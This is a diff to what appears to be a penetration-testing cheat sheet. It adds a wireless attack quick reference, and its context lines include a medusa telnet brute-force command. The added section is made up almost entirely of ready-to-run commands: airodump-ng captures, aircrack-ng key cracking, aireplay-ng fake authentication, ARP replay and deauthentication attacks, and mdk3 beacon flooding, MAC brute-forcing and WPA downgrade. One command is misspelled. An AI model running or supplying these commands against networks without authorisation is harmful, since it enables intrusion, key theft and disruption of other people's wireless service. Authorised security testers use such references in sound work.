@@ -53,6 +53,7 @@
 	- [SSH Tunnels](#ssh-tunnels)
 	- [Impacket](#impacket)
 	- [Brute Force Techniques](#brute-force-techniques)
+	- [Wireless Quick Reference](#wireless-quick-reference)
 - [Web Exploitation](#web-exploitation)
 	- [SQL](#sql)
 	- [XSS](#xss)
@@ -2675,6 +2676,87 @@ Telnet Brute
 ```
 	medusa -M telnet -C /usr/share/wordlists/telnet.lst -H 23.txt -T 10 -t 3| grep SUCCESS |tee medusa-results.txt
 ```
+
+## Wireless Quick Reference
+
+Place wlan0 in monitor mode
+```
+    airmon-ng check kill
+    airmon-ng start wlan0
+```
+
+Change virtual monitor mac
+```
+    ifconfig wlan0mon down
+    macchanger -m xx:yy:xx:77:88:99 wlan0mon
+    ifconfig wlan0mon up
+```
+
+Run airodump
+```
+    airodoump-ng wlan0mon
+```
+
+Limit to bssid (ensure to select channel and bssid)
+```
+    airodump-ng -c 8 --bssid 00:00:00:00:00 -w capture wlan0mon
+```
+
+Attempt crack (change bssid as appropriate)
+```
+    aircrack-ng -b 00:00:00:00:00:00 capture-01.cap
+```
+
+Injection test
+```
+    aireplay-ng --fakeauth 0 -e "ESSID" -a 00:00:00:00:00:00 wlan0mon
+```
+
+Replay (b is bssid, h is client mac)
+```
+    aireplay-ng --arpreplay -b 00:01:02:03:04:05 -h 00:04:05:06:07:08 wlan0mon
+```
+
+Aggressive replay (a is bssid, c is client mac)
+```
+    aireplay-ng --deauth 5 -a 00:01:02:03:04:05 -c 00:04:05:06:07:08 wlan0mon
+```
+
+Deauth (change 1 for multiple deauths, a is AP mac, c is client mac
+```
+    aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 wlan0mon
+```
+
+mdk3 broadcast ap to clients
+```
+    mdk3 wlan0mon b
+```
+
+mdk3 check hidden ssid
+```
+    mdk3 wlan0 p
+```
+
+mdk3 mac brute
+```
+    mdk3 wlan0 f
+```
+
+mdk3 wpa downgrade
+```
+    mdk3 wlan0 g -t 00:18:0A:33:C9:92
+```
+
+mdk3 deauth specific target
+```
+    mdk3 wlan0mon d -c 6 -b ~/target.txt
+```
+
+mdk3 auth test to ap
+```
+    mdk3 wlan0mon a -a bssid
+```
+
 
 # Web Exploitation
 ## SQL
